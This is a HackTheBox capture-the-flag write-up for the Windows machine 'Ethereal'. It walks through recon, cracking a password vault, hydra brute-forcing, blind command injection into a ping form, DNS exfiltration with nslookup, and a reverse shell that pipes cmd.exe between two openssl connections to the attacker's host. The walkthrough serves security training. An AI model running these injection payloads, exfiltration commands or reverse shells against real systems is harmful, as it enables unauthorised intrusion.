---
title: HTB: Ethereal
url: https://0xdf.gitlab.io/2019/03/09/htb-ethereal.html
date: 2019-03-09T13:47:00+00:00
difficulty: Insane [50]
os: Windows
tags: ctf, hackthebox, htb-ethereal, nmap, pbox, credentials, injection, hydra, python, shell, dns-c2, firewall, nslookup, openssl, lnk, pylnker, lnkup, wfuzz, ca, msi, windows
---

![Ethereal-cover](https://0xdfimages.gitlab.io/img/ethereal-cover.png)

Ethereal was quite difficult, and up until a few weeks ago, potentially the hardest on HTB. Still, it was hard in a fun way. The path through the box was relatively clear, and yet, each step presented a technical challenge to figure out what was going on and how I could use it to get what I wanted. I’ll start by breaking into an old password vault that I find on FTP, and using that to authenticate to a website. That site has code injection, and I’ll use that to get exfil and eventually a weak shell over DNS. I’ll discover OpenSSL, and use that to get a more stable shell. From there, I’ll replace a shortcut to escalate to the next user. Then I’ll user CA certs that I find on target to sign an MSI file to give me shell as the administrator. I’ll also attach two additional posts, one going into how I attacked pbox, and another on how I developed a shell over blind command injection and dns.

## Box Info

| Name | [Ethereal](https://hackthebox.com/machines/ethereal)  [Ethereal](https://hackthebox.com/machines/ethereal) [Play on HackTheBox](https://hackthebox.com/machines/ethereal) |
| --- | --- |
| Release Date | [06 Oct 2018](https://twitter.com/hackthebox_eu/status/1047459270877478917) |
| Retire Date | 02 Mar 2019 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Ethereal |
| Radar Graph | Radar chart for Ethereal |
| First Blood User | 18:43:59[arkantolo arkantolo](https://app.hackthebox.com/users/1183) |
| First Blood Root | 18:38:55[arkantolo arkantolo](https://app.hackthebox.com/users/1183) |
| Creators | [MinatoTW MinatoTW](https://app.hackthebox.com/users/8308)  [egre55 egre55](https://app.hackthebox.com/users/1190) |

## Recon

### nmap

`nmap` shows three open ports, ftp (21) and two http (80 and 8080):

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.106
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-08 15:38 EST
Nmap scan report for 10.10.10.106
Host is up (0.070s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 73.19 seconds

root@kali# nmap -sC -sV -p 21,80,8080 -oA nmap/scripts 10.10.10.106
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-08 15:41 EST
Nmap scan report for 10.10.10.106
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.249.135 is not the same as 10.10.10.106
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ethereal
8080/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.30 seconds

root@kali# nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.10.10.106
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-08 15:41 EST
Nmap scan report for 10.10.10.106
Host is up (0.020s latency).
All 65535 scanned ports on 10.10.10.106 are open|filtered

Nmap done: 1 IP address (1 host up) scanned in 13.53 seconds

```

Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services), I can guess this is likely Windows10 or Server2016 or Server 2019.

### FTP - TCP 21

#### Get Files

Whenever there’s anonymous login to an FTP server, it’s worth checking it out. There’s a bunch of stuff here:

```

root@kali# ftp 10.10.10.106
Connected to 10.10.10.106.
220 Microsoft FTP Service
Name (10.10.10.106:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
hRemote system type is Windows_NT.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
07-10-18  09:03PM       <DIR>          binaries
09-02-09  08:58AM                 4122 CHIPSET.txt
01-12-03  08:58AM              1173879 DISK1.zip
01-22-11  08:58AM               182396 edb143en.exe
01-18-11  11:05AM                98302 FDISK.zip
07-10-18  08:59PM       <DIR>          New folder
07-10-18  09:38PM       <DIR>          New folder (2)
07-09-18  09:23PM       <DIR>          subversion-1.10.0
11-12-16  08:58AM                 4126 teamcity-server-log4j.xml
226 Transfer complete.

```

I’ll collect a lot of the files and check them out, making sure to switch to binary transfer by typing `bin` before i make any gets.

#### Identify and Mount Disk Files

After pulling the files back and looking at them, I notice that from two zip files, I have three disk images:

```

root@kali# unzip DISK1.zip 
Archive:  DISK1.zip
  inflating: DISK1
  inflating: DISK2
root@kali# unzip FDISK.zip 
Archive:  FDISK.zip
  inflating: FDISK

root@kali# file *DISK{,1,2}
FDISK: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "MSDOS5.0", root entries 224, sectors 2880 (volumes <=32 MB), sectors/FAT 9, sectors/track 18, serial number 0x5843af55, unlabeled, FAT (12 bit), followed by FAT
DISK1: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "MSDOS5.0", root entries 224, sectors 2880 (volumes <=32 MB), sectors/FAT 9, sectors/track 18, serial number 0x8c271e81, unlabeled, FAT (12 bit), followed by FAT
DISK2: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "MSDOS5.0", root entries 224, sectors 2880 (volumes <=32 MB), sectors/FAT 9, sectors/track 18, serial number 0x8c271fb9, unlabeled, FAT (12 bit), followed by FAT

```

While the first two don’t have labels on their file system, `FDISK` is labelled “PASSWORDS”:

```

root@kali# e2label FDISK
e2label: Bad magic number in super-block while trying to open FDISK
FDISK contains a vfat file system labelled 'PASSWORDS'

```

I can mount a disk file with `mount [DISK file] [path to empty folder]`. For example:

```

root@kali# mount -o loop FDISK /mnt/fdisk

root@kali# tree /mnt/fdisk/
/mnt/fdisk/
└── pbox
    ├── pbox.dat
    └── pbox.exe

1 directory, 2 files

```

### Password Box

#### Background

[PasswordBox](https://sourceforge.net/projects/passwbox/), or pbox.exe, is a dos-based password manager. I could move both the executable and the dat file to a Windows host. Or I can use `dosbox` on Linux. But there’s also a Linux client on the [downloads page](https://sourceforge.net/projects/passwbox/files/pbox%20v0.11/), and it worked just fine after I installed a couple packages:

```

apt install libncurses5:i386 bwbasic

```

#### Interacting with PasswordBox

Once I got the packages installed, running `./pbox` tried to create a new database:

```

root@kali# ./pbox
No database have been found. Your encrypted database will be initialised now.
The database will be stored at the following location:
/root/.pbox.dat

Choose a master password:

```

That’s not what I wanted, so I quit. But it did tell me where the db would be stored, so I copied the .dat file to `/root/.pbox.dat`, and ran again:

```

root@kali# ./pbox
Enter your master password:

```

That’s progress. When I give it a bad password, it sleeps for a bit, and then outputs:

```

root@kali# ./pbox
Enter your master password: ********
Password rejected.

```

I also took a look at `--help`:

```

root@kali# ./pbox --help
PasswordBox v0.11 Copyright (C) Mateusz Viste 2009-2010
 // Credits to Chris Brown (aka Zamaster) for his great AES implementation //

PasswordBox is a console-mode program which will keep all your passwords safe, inside an encrypted database.

Usage: pbox [--help] [--dump]
  --help  displays this help screen
  --dump  lists all the data of your encrypted database onscreen

CAUTION: This program features 128 bits AES encryption, which might be illegal in your country.

This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your       
option) any later version.
This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for 
more details.
You should have received a copy of the GNU General Public License along with this program. If not, see <http://www.gnu.org/licenses/>.                                                                                     

On your system, the PasswordBox encrypted database is stored at the following location:
/root/.pbox.dat

```

#### password

In playing with the software, I guessed the right password by accident (“password”). That said, I thought it’d be interesting to explore how I would have got the password had it been something else. Check out the next post, [Ethereal Attacking Password Box](/2019/03/09/htb-ethereal-pbox.html), for details.

#### Dump

With the right password, the program loads a full screen interactive menu:

![1551039658042](https://0xdfimages.gitlab.io/img/1551039658042.png)

Having seen the `--dump` option, I just exited out of there and ran it:

```

root@kali# ./pbox --dump
Enter your master password: ********
databases  ->  7oth3B@tC4v3!
msdn  ->  alan@ethereal.co / P@ssword1!
learning  ->  alan2 / learn1ng!
ftp drop  ->  Watch3r
backup  ->  alan / Ex3cutiv3Backups
website uploads  ->  R3lea5eR3@dy#
truecrypt  ->  Password8
management server  ->  !C414m17y57r1k3s4g41n!
svn  ->  alan53 / Ch3ck1ToU7>

```

I created lists of usernames and passwords for later:

```

root@kali# cat usernames 
alan
alan2
alan53
alan@ethereal.co

root@kali# cat passwords 
7oth3B@tC4v3!
P@ssword1!
learn1ng!
Watch3r
Ex3cutiv3Backups
R3lea5eR3@dy#
Password8
!C414m17y57r1k3s4g41n!
Ch3ck1ToU7>

```

### Website - TCP 80

#### Site

The site web root is for a Company:

![1551040119685](https://0xdfimages.gitlab.io/img/1551040119685.png)

If I click on “MENU”, there’s several options:

![1551040213615](https://0xdfimages.gitlab.io/img/1551040213615.png)

#### Admin

The only interesting link in the menu is “Admin”. It takes me to a page that welcomes me, and has a “Menu” button on the top left:

![1551040339184](https://0xdfimages.gitlab.io/img/1551040339184.png)

Opening that menu gives 4 options:

![1551040362044](https://0xdfimages.gitlab.io/img/1551040362044.png)

“Notes” has a note to Alan (the same name from the password manager):

![1551040394607](https://0xdfimages.gitlab.io/img/1551040394607.png)

“Messages” doesn’t go anywhere.

“Desktop” Loads what looks like a desktop, but none of the links work, except clicking on `user.txt` opens a troll window that looks like notepad:

![1551040491268](https://0xdfimages.gitlab.io/img/1551040491268.png)

“Ping” directs me to `ethereal.htb:8080`.

### Website - TCP 8080

#### Hostname

If I try to visit `http://10.10.10.106:8080`, it returns invalid hostname:

![1551040625393](https://0xdfimages.gitlab.io/img/1551040625393.png)

Once I set my `/etc/hosts` file to reflect the hostname as I learned it from the ping link, the page now offers http basic auth:

![1551040689973](https://0xdfimages.gitlab.io/img/1551040689973.png)

#### Hydra

I’ll use `hydra` to try all the username/password combinations from pbox. I’ll pass in both my username list and my password list and I can just use the `http-get` module. It returns almost instantly with a password that works:

```

root@kali# hydra -L usernames -P passwords -s 8080 -f ethereal.htb http-get /
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-02-24 15:38:55
[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:4/p:9), ~3 tries per task
[DATA] attacking http-get://ethereal.htb:8080/
[8080][http-get] host: ethereal.htb   login: alan   password: !C414m17y57r1k3s4g41n!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-02-24 15:39:00

```

#### Ping Panel

Once I log in with alan’s credentials, I have access to a simple form:

![1551041032445](https://0xdfimages.gitlab.io/img/1551041032445.png)

If I enter 127.0.0.1 and hit enter, I get a response:

![1551041072149](https://0xdfimages.gitlab.io/img/1551041072149.png)

If I put in my own IP, and start `tcpdump`, I see the pings (2 of them):

```

root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
15:43:53.043972 IP ethereal.htb > kali: ICMP echo request, id 1, seq 3, length 40
15:43:53.044037 IP kali > ethereal.htb: ICMP echo reply, id 1, seq 3, length 40
15:43:55.068936 IP ethereal.htb > kali: ICMP echo request, id 1, seq 4, length 40
15:43:55.068981 IP kali > ethereal.htb: ICMP echo reply, id 1, seq 4, length 40

```

## Shell As Alan

### Enumeration

#### RCE Discovery

I wanted to see if I could inject commands into this panel. Since the only output I see is “Connection to host successful”, I won’t be able to just add `& whoami` to the end and see the output. The first strategy that I would try is to send out results over the network. This is easier on Linux where I have `nc`, `curl`, etc. On Windows, I can try `certutil`, `ping`, `powershell`.

I decided to try a really simple injection - adding commands to the end. In Windows, there are three types of [conditional execution](https://ss64.com/nt/syntax-conditional.html):
- `command1 && command2` - Run 2 if 1 succeeds
- `command1 || command2` - Run 2 if 1 fails
- `command1 & command2` - Run both

If I enter `127.0.0.1 & ping 10.10.14.14`, it should ping itself, and then me. I’ll watch in `tcpdump`:

```

root@kali# tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
09:03:43.507202 IP 10.10.10.106 > 10.10.14.14: ICMP echo request, id 1, seq 87, length 40
09:03:43.507263 IP 10.10.14.14 > 10.10.10.106: ICMP echo reply, id 1, seq 87, length 40
09:03:44.631350 IP 10.10.10.106 > 10.10.14.14: ICMP echo request, id 1, seq 88, length 40
09:03:44.631369 IP 10.10.14.14 > 10.10.10.106: ICMP echo reply, id 1, seq 88, length 40
09:03:45.576903 IP 10.10.10.106 > 10.10.14.14: ICMP echo request, id 1, seq 89, length 40
09:03:45.576920 IP 10.10.14.14 > 10.10.10.106: ICMP echo reply, id 1, seq 89, length 40
09:03:46.687291 IP 10.10.10.106 > 10.10.14.14: ICMP echo request, id 1, seq 90, length 40
09:03:46.687331 IP 10.10.14.14 > 10.10.10.106: ICMP echo reply, id 1, seq 90, length 40

```

Not only does it ping me, but 5 times, the default in Windows. The ping I got from the panel the first time was 2 times, so the script likely ran something like `ping -n 2 127.0.0.1 & ping 10.10.14.14`.

#### PowerShell

I wanted to see if I could run PowerShell commands. Since `&&` and `||` are based on the error level returned, I can use that to determine if things are succeeding.

I’ll demonstrate in my Windows VM. When I have a successful PowerShell command, the ErrorLevel is 0. When I enter something that fails, it’s 1.

```

C:\Users\0xdf>powershell -c echo yay
yay

C:\Users\0xdf>echo %ERRORLEVEL%
0

C:\Users\0xdf>powershell -c echod yay
echod : The term 'echod' is not recognized as the name of a cmdlet, function, script file, or operable program. Check
the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ echod yay
+ ~~~~~
    + CategoryInfo          : ObjectNotFound: (echod:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

C:\Users\0xdf>echo %ERRORLEVEL%
1

```

So if I enter `& dir || ping 10.10.14.14`, I don’t get pings in `tcpdump`, because the `dir` succeeds and ends the or. If I change that to `& dir && ping 10.10.14.14`, I do get pings.

So now I can see if I can run PowerShell. I’ll enter `& powershell -c echo test || ping 10.10.14.14`. Unfortunately, I get pings. So PowerShell is not available to me.

#### certutil

`certutil` is a good way to get files on Windows. I entered `& certutil -urlcache -split -f http://10.10.14.14/test.txt \windows\temp\test.txt|| ping 10.10.14.14` into the ping panel. Again, I got pings. This could fail for several reasons. Perhaps it can’t communicate out (I had a `nc` listening, and it didn’t reach me). But it also could have failed if it just couldn’t write to `\windows\temp\`.

#### nslookup

What about DNS outbound? I set up `tcpdump` and issued the following: `& nslookup 0xdf.com 10.10.14.14`. I got queries:

```

root@kali# tcpdump -ni tun0 udp port 53
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
09:32:41.022549 IP 10.10.10.106.64973 > 10.10.14.14.53: 1+ PTR? 14.14.10.10.in-addr.arpa. (42)
09:32:43.044754 IP 10.10.10.106.64974 > 10.10.14.14.53: 2+ A? 0xdf.com. (26)
09:32:45.035277 IP 10.10.10.106.64975 > 10.10.14.14.53: 3+ AAAA? 0xdf.com. (26)
09:32:47.051044 IP 10.10.10.106.64976 > 10.10.14.14.53: 4+ A? 0xdf.com. (26)
09:32:49.051423 IP 10.10.10.106.64977 > 10.10.14.14.53: 5+ AAAA? 0xdf.com. (26)

```

Now I have a C2 method.

### Shell

I wrote a shell in python that will take advage of this command injection and DNS exfil to give interaction with the system. I’ll detail that process in a [separate post](/2019/03/09/htb-ethereal-shell.html) (linked here and also at the bottom of the table of contents on the left). [m0noc](https://www.hackthebox.eu/home/users/profile/4365) made an excellent and quite thorough [video on DNS exfil](https://www.youtube.com/watch?v=Egwp5zc5ZIM) that was based on this box that is also worth watching.

The TL;DR on my shell is that I can use the injection and DNS exfil discovered above to get a pretty solid (albeit very slow) shell. It loses white space and any line with a word ending in `..`, and it drops the character `/`. But it’s enough to do some initial enumeration to find a better access:

```

root@kali# ./ethereal_shell.py
[*] Starting DNS Sniffer on tun0 for target 10.10.10.106.
[*] Logging in and fetching state information.
[+] State information received.
ethereal> whoami
etherealalan

ethereal> dir \
Volume in drive C has no label.
Volume Serial Number is FAD9-1FD5
Directory of c:
07/07/2018 09:57 PM <DIR> Audit
06/30/2018 10:10 PM <DIR> inetpub
06/26/2018 05:51 AM <DIR> Program Files
07/16/2018 08:55 PM <DIR> Program Files (x86)
07/05/2018 09:38 AM <DIR> Users
07/01/2018 09:57 PM <DIR> Windows
0 File(s) 0 bytes
6 Dir(s) 15,409,475,584 bytes free

ethereal> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name Description State
============================= ========================================= ========
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeImpersonatePrivilege Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

```

## Better Shell as Alan

### Enumeration - Programs

Using this shell to look around, there are some interesting files. No user.txt, but there is a note-draft.txt on the user’s desktop. But the priority right now is to develop a more stable access. I still can’t get PowerShell to do anything interesting. So I decided to check out Program Files:

```

ethereal> dir /x \progra~2
Volume in drive C has no label.
Volume Serial Number is FAD9-1FD5
Directory of c:progra~2
07/16/2018 08:55 PM <DIR> .
06/30/2018 09:02 PM <DIR> COMMON~1 Common Files
06/26/2018 01:10 AM <DIR> INTERN~1 Internet Explorer
06/30/2018 09:02 PM <DIR> MICROS~1 Microsoft SDKs
06/30/2018 09:04 PM <DIR> MICROS~2 Microsoft Visual Studio
07/16/2016 01:23 PM <DIR> MICROS~1.NET Microsoft.NET
06/30/2018 09:06 PM <DIR> MSBuild
06/26/2018 09:55 PM <DIR> OPENSS~1.0 OpenSSL-v1.1.0
06/26/2018 05:51 AM <DIR> REFERE~1 Reference Assemblies
06/26/2018 10:13 PM <DIR> WINDOW~1 Windows Defender
06/26/2018 10:13 PM <DIR> WINDOW~2 Windows Mail
06/26/2018 10:13 PM <DIR> WINDOW~3 Windows Media Player
07/16/2016 01:23 PM <DIR> WINDOW~4 Windows Multimedia Platform
07/16/2016 01:23 PM <DIR> WI67CB~1 Windows NT
06/26/2018 10:13 PM <DIR> WI8A19~1 Windows Photo Viewer
07/16/2016 01:23 PM <DIR> WIBFE5~1 Windows Portable Devices
07/16/2016 01:23 PM <DIR> WID5B1~1 WindowsPowerShell
0 File(s) 0 bytes
18 Dir(s) 15,460,114,432 bytes free

```

I will use `dir /x` to get the Windiws [8.3 names](https://en.wikipedia.org/wiki/8.3_filename) because they are much easier to deal with without spaces.

`OpenSSL` is interesting to me. That’s something I can use to communicate out. Digging deeper, I’ll find the full path to the binary to be: `\progra~2\openss~1.0\bin\openssl.exe`.

I can get the version, so I know I can run it:

```

ethereal> \progra~2\openss~1.0\bin\openssl.exe version
OpenSSL 1.1.0h 27 Mar 2018

```

### Enumeration - Firewall

`openssl` only helps me if I can find a way to communicate home. Everything I’ve tried thus far except DNS has been blocked. I’ll show three ways to find two open TCP ports.

#### For Loop On Ethereal

I added a `quite` command to the shell so I could do commands that don’t require output over dns. Running a FOR loop inside the FOR loop used by the DNS was messing something up. Now I can do this:

```

ethereal> quiet FOR /L %G IN (1,1,200) DO (c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:%G)

```

That will try to connect to me on all the ports 1-200, by sending a POST that has a search field that looks like `search=& ( FOR /L %G IN (1,1,200) DO (c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:%G) )`.

I’ll watch for tcp syn packets from 10.10.10.106 in `tcpdump`:

```

root@kali# tcpdump -ni tun0 "src host 10.10.10.106 and tcp[tcpflags] == (tcp-syn)"
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
17:56:07.919571 IP 10.10.10.106.49754 > 10.10.14.14.73: Flags [S], seq 793376072, win 8192, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0
17:56:08.528789 IP 10.10.10.106.49754 > 10.10.14.14.73: Flags [S], seq 793376072, win 8192, options [mss 1357,nop,nop,sackOK], length 0
17:56:53.276709 IP 10.10.10.106.49817 > 10.10.14.14.136: Flags [S], seq 2392131827, win 8192, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0
17:56:54.275185 IP 10.10.10.106.49817 > 10.10.14.14.136: Flags [S], seq 2392131827, win 8192, options [mss 1357,nop,nop,sackOK], length 0

```

I get connections back on two ports, 73 and 136.

#### Firewall

I’m going to use the `netsh advfirewall` command to print the firewall rules, but I’m going to just get the name lines (using `findstr`, Window’s `grep` equivalent), because my shell is so slow:

```

ethereal> cmd /c "netsh advfirewall firewall show rule name=all|findstr Name:"
Rule Name: @{Microsoft.XboxGameCallableUI_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.XboxGameCallableUI/resources/PkgDisplayName}
Rule Name: @{Microsoft.Windows.Apprep.ChxApp_1000.14393.2339.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Apprep.ChxApp/resources/DisplayName}
Rule Name: @{Microsoft.LockApp_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.LockApp/resources/AppDisplayName}
Rule Name: @{Microsoft.AccountsControl_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.AccountsControl/Resources/DisplayName}
Rule Name: @{Microsoft.Windows.Cortana_1.7.0.14393_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Cortana/resources/PackageDisplayName}
Rule Name: @{Microsoft.Windows.Cortana_1.7.0.14393_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Cortana/resources/PackageDisplayName}
Rule Name: @{Microsoft.Windows.ShellExperienceHost_10.0.14393.2068_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.ShellExperienceHost/resources/PkgDisplayName}
Rule Name: @{Microsoft.Windows.CloudExperienceHost_10.0.14393.1066_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.CloudExperienceHost/resources/appDescription}
Rule Name: @{Microsoft.Windows.CloudExperienceHost_10.0.14393.1066_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.CloudExperienceHost/resources/appDescription}
Rule Name: @{Microsoft.AAD.BrokerPlugin_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/resources/PackageDisplayName}
Rule Name: @{Microsoft.AAD.BrokerPlugin_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/resources/PackageDisplayName}
Rule Name: FTP (non-SSL)
Rule Name: Allow ICMP Reply
Rule Name: Allow ICMP Request
Rule Name: Allow UDP Port 53
Rule Name: Allow TCP Ports 73, 136
Rule Name: Allow Port 80, 8080
Rule Name: Allow ICMP Request
Rule Name: Allow ICMP Reply

```

Immediately `Rule Name: Allow TCP Ports 73, 136` jumps out. I can use `openssl` as in the previous method to check that those ports are allowed out.

#### wfuzz

Stepping back, what I am actually doing is issuing a web request that results in traffic showing up in `tcpdump`. Rather than loop on target (which was kind of slow), why not loop locally and send a lot of requests. That’s what `wfuzz` is perfect for. I’ll go into burp and get the most recent parameters. I don’t need output, so I can do simple command injection without the for command loop and the nslookup. I’ll start `tcpdump`, and run `wfuzz`:
- `-z range,1-1000` - The items I’ll fuzz over, the numbers 1 to 1000.
- `--hs 'body'` - This hides results based on regex match; I’m getting results though `tcpdump`, so ‘body’ should match on all results, hiding all results.
- `-H 'Authorization: Basic YWxhbjohQzQxNG0xN3k1N3IxazNzNGc0MW4h'` - Basic auth.
- `-d ...&search=%26+c%3a\progra~2\openss~1.0\bin\openssl.exe+s_client+-quiet+-connect+10.10.14.14%3aFUZZ&...` - The command to connect to my host on the FUZZ port.

```

root@kali# wfuzz -c -z range,1-1000 --hs 'body' -H 'Authorization: Basic YWxhbjohQzQxNG0xN3k1N3IxazNzNGc0MW4h' -d '__VIEWSTATE=%2FwEPDwULLTE0OTYxODU3NjhkZITN0C6%2BrURibXNBMKWX85%2BZAtp3
%2FromW6YbvRa9SBIT&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAOibSRuA65MRmFrDi2mLaOa4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p%2B9jPAN%2BI0nXEbEPM6Iq7BrPR58eJPgkqLtaYmjHN%2FiNgZYxL2A%3D%3D&search=%26+c%3a\progra~2
\openss~1.0\bin\openssl.exe+s_client+-quiet+-connect+10.10.14.14%3aFUZZ&ctl02=' http://ethereal.htb:8080
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://ethereal.htb:8080/
Total requests: 1000

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

Total time: 1538.89876
Processed Requests: 1000
Filtered Requests: 1000
Requests/sec.: 0.649815

```

Monitoring the `tcpdump` window reveals the two open ports:

```

root@kali# tcpdump -ni tun0 "src host 10.10.10.106 and tcp[tcpflags] == (tcp-syn)"
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
07:00:58.213236 IP 10.10.10.106.49969 > 10.10.14.14.73: Flags [S], seq 76461250, win 8192, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0
07:00:59.163625 IP 10.10.10.106.49969 > 10.10.14.14.73: Flags [S], seq 76461250, win 8192, options [mss 1357,nop,nop,sackOK], length 0
07:01:42.997152 IP 10.10.10.106.50032 > 10.10.14.14.136: Flags [S], seq 1927768196, win 8192, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0
07:01:43.920329 IP 10.10.10.106.50032 > 10.10.14.14.136: Flags [S], seq 1927768196, win 8192, options [mss 1357,nop,nop,sackOK], length 0

```

### Shell via OpenSSL

#### Why

I’ve already shown that from my current access, I can’t run PowerShell. Now that I have identified some open ports, I could try to bring a binary to target that would connect back to me on one of them, but this box is quite hostile to letting me run much. I do understand there’s a way to bypass the restrictions using COR PROFILERS. If I have a chance to figure that out, I may add a follow up post later. But for now I went with OpenSSL for a shell.

#### Generate SSL Cert

With two ports I can communicate on and `openssl`, I can make a more stable shell. First I need SSL certs for the connection.

```

root@kali# openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes                                                                                    
Generating a RSA private key
.................................................................................................................................++++                                                                                      
..................................++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

root@kali# ls *.pem
cert.pem  key.pem

```

#### Test Connection

Now I’ll test that I can connect and send data using the following:

```

ethereal> quiet ( echo "test" | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:73 )

```

```

root@kali# openssl s_server -quiet -key key.pem -cert cert.pem  -port 73
"test"

```

#### Shell

To make a shell, I’m going to use two `openssl` calls, with one piping output into `cmd`, and the output of that piped into the other. I can type commands into one connection and get results back on the other. For more details, check out [this post, OpenSSL == NC](https://blog.inequationgroup.com/openssl-nc/).

I’ll start two `openssl` servers just as above, and then run the following:

```

ethereal> quiet start cmd /c "c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:73 | cmd.exe | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:136"

```

Note that the `start` is really important here as that opens this in a new process so that it stays running after the web request times out.

The listener on 73 doesn’t show anything, but on 136, I get:

```

root@kali# openssl s_server -quiet -key key.pem -cert cert.pem  -port 136
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>

```

If I type into the 73 listener, I get results (including the command typed) in the 136 listener:

```

root@kali# rlwrap openssl s_server -quiet -key key.pem -cert cert.pem  -port 73
whoami

```

```

c:\windows\system32\inetsrv>whoami
ethereal\alan

c:\windows\system32\inetsrv>

```

Given that the entire transcript shows up in the 136 window, I will just show that from now on. But know that every command I type into this shell is actually entered into the port 73 connection. Also, I’m using `rlwrap` on the port 73 connection. That gives me history with up arrow on that terminal.

## Shell as Jorge

### Enumeration

On alan’s desktop, I don’t find `user.txt`, but I do find `note-draft.txt`:

```

c:\Users\alan\Desktop>type note-draft.txt
I've created a shortcut for VS on the Public Desktop to ensure we use the same version. Please delete any existing shortcuts and use this one instead.
- Alan

```

It might appear that public doesn’t have a desktop, but it’s just hidden, and will show up with a `/a`:

```

c:\Users\Public>dir /a
 Volume in drive C has no label.
 Volume Serial Number is FAD9-1FD5

 Directory of c:\Users\Public

07/07/2018  10:25 PM    <DIR>          .
07/07/2018  10:25 PM    <DIR>          ..
07/04/2018  08:42 PM    <DIR>          AccountPictures
07/17/2018  08:26 PM    <DIR>          Desktop
07/16/2016  01:21 PM               174 desktop.ini
06/25/2018  02:51 PM    <DIR>          Documents
